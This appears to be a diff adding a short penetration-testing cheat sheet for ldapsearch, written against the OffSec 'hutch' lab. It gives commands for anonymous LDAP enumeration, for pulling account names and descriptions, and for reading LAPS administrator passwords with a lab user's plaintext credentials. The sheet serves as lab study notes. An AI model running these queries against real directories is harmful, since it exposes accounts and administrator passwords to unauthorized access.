@@ -1,0 +1,18 @@
+% ldapsearch
+
+#get domain info ie naming context
+ldapsearch -x -H ldap://<IP> -s base namingcontexts
+
+# null credentials
+ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+
+# example: hutch
+ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
+ grep sAMAccountName:
+ldapsearch -x -h 192.168.159.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
+ldapsearch -x -h 192.168.64.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
+
+# if LAPS application is used
+ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
